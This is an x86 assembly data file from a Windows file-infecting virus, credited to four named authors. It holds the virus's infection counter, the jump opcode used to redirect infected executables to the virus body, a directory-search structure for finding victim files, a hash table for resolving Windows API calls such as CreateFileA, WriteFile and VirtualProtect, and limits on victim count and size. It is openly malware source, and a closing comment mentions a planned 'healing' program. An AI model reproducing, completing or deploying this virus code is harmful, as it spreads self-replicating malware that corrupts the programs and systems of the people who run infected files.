;-----------------------------------------------------------------------------------------
;Authors: Maslov Mikhail, Sokolov Igor, Bolotin Petr, Kaloshin Pavel.
;-----------------------------------------------------------------------------------------


;-----------------------------------------------------------------------------------------
;This file contains data information for our program.
;-----------------------------------------------------------------------------------------

;-----------------------------------------------------------------------------------------
begin_data:                                     ; Beginning of data section.
;-----------------------------------------------------------------------------------------
infect_count   db 0                             ; Infected programs counter.
j_m_p          db 0E9h                          ; The offset to jump on virus code later 
                                                ; in virus_code.asm
                                                ; We need this variable to jump to our 
												; virus at the beginning of infected one.
save_vir_b     db 5 dup(0)                      ; Filling 5 bytes with null.
old_save_vir_b db 5 dup(0)                      ; Filling 5 bytes with null.
dwSectionAlignment dd 0                         ; Some strange variable for aligning code 
                                                ; to find the place virus is written in 
                                                ; .exe file.
;-----------------------------------------------------------------------------------------
;We will use this structure while using FindFirstFile and FindNextFile functions.
;-----------------------------------------------------------------------------------------
WIN32_FIND_DATA           label    byte
  WFD_dwFileAttributes    dd       0
  WFD_ftCreationTime      dq	   0
  WFD_ftLastAccessTime    dq       0
  WFD_ftLastWriteTime     dq       0
  WFD_nFileSizeHigh       dd       0
  WFD_nFileSizeLow        dd       0
  WFD_dwReserved0         dd       0
  WFD_dwReserved1         dd       0
  WFD_szFileName          db       260 dup (0)
  WFD_szAlternateFileName db       14 dup (0)
WIN32_FIND_DATA_END       label    byte
;-----------------------------------------------------------------------------------------              
delta_off           equ [ebp+18h]               ; Shows delta offset for virus code.
;-----------------------------------------------------------------------------------------   
; After we have used CalcHash, we could find function hash in stack.
;-----------------------------------------------------------------------------------------   
CloseHandle         equ dword ptr [ebp-4*1]
FindFirstFileA      equ dword ptr [ebp-4*2]
FindNextFileA       equ dword ptr [ebp-4*3]
CreateFileA         equ dword ptr [ebp-4*4]
ReadFile            equ dword ptr [ebp-4*5]
GlobalAlloc         equ dword ptr [ebp-4*6]
GetFileSize         equ dword ptr [ebp-4*7]
SetFilePointer      equ dword ptr [ebp-4*8]
WriteFile           equ dword ptr [ebp-4*9]               
GlobalFree          equ dword ptr [ebp-4*10]
VirtualProtect      equ dword ptr [ebp-4*11]
_ExitProcess        equ dword ptr [ebp-4*12]
GetProcAddress      equ dword ptr [ebp-4*13]
LoadLibrary         equ dword ptr [ebp-4*14]
FindClose           equ dword ptr [ebp-4*15]
GetModuleFileNameA  equ dword ptr [ebp-4*16]
SetCurrentDirectoryA equ dword ptr [ebp-4*17]
FreeLibrary         equ dword ptr [ebp-4*18]
hFind               equ dword ptr [ebp-4*19]
hFile               equ dword ptr [ebp-4*20]
dwFileSize          equ dword ptr [ebp-4*21]
dwAlignedFileSize   equ dword ptr [ebp-4*22]
pAllocMem           equ [ebp-4*23]
base_s              equ [ebp-4*24]
;-----------------------------------------------------------------------------------------
; Table of function hashes.
;-----------------------------------------------------------------------------------------
HashTable:
dd 0F867A91Eh                                   ; CloseHandle
dd 03165E506h                                   ; FindFirstFileA
dd 0CA920AD8h                                   ; FindNextFileA
dd 0860B38BCh                                   ; CreateFileA
dd 029C4EF46h                                   ; ReadFile
dd 0CC17506Ch                                   ; GlobalAlloc
dd 0AAC2523Eh                                   ; GetFileSize
dd 07F3545C6h                                   ; SetFilePointer
dd 0F67B91BAh                                   ; WriteFile
dd 03FE8FED4h                                   ; GlobalFree
dd 015F8EF80h                                   ; VirtualProtect
dd 0D66358ECh                                   ; ExitProcess
dd 05D7574B6h                                   ; GetProcAddress
dd 071E40722h                                   ; LoadLibraryA
dd 0E65B28ACh                                   ; FindClose
dd 059B44650h                                   ; GetModuleFileNameA
dd 00709DC94h                                   ; SetCurrentDirectoryA
dd 0D64B001Eh                                   ; FreeLibrary
dw 0FFFFh                                       ; End of table label.
;-----------------------------------------------------------------------------------------
; File access modes.
;-----------------------------------------------------------------------------------------
GENERIC_READ     equ 80000000h
GENERIC_WRITE    equ 40000000h
FILE_SHARE_READ  equ 1
FILE_SHARE_WRITE equ 2
OPEN_EXISTING    equ 3
;-----------------------------------------------------------------------------------------
; File attributes.
;-----------------------------------------------------------------------------------------
FILE_ATTRIBUTE_HIDDEN equ 2
FILE_ATTRIBUTE_SYSTEM equ 4
FILE_ATTRIBUTE_NORMAL equ 80h
;-----------------------------------------------------------------------------------------
; Maximum number of victim programs.
;-----------------------------------------------------------------------------------------
MaxVictimNumber equ 2
;-----------------------------------------------------------------------------------------
; Maximum victim file size (bytes).
;-----------------------------------------------------------------------------------------
CheckVictimSize equ 0                           ; Check size? If null, any size file will 
                                                ; be infected.
MaxVictimSize equ   35 * 1024                   ; Maximum size of program to infect.
;-----------------------------------------------------------------------------------------
; Virus size in bytes.
;-----------------------------------------------------------------------------------------
Virsize equ $-start
;-----------------------------------------------------------------------------------------
end_data:    ; End of data section.
;-----------------------------------------------------------------------------------------
;-----------------------------------------------------------------------------------------
; We will need this variables later, when we'll try to make "healing" program.
;-----------------------------------------------------------------------------------------
dd Virsize                                      ; Code size in bytes.
dd $ - save_vir_b - 4 + 4096 - Virsize          ; save_vir_b offset of the end of 4096-byte
                                                ; block.
dd begin_data - start                           ; begin_data label offset of start label.
dd HashTable - start                            ; HashTable label offset of start label.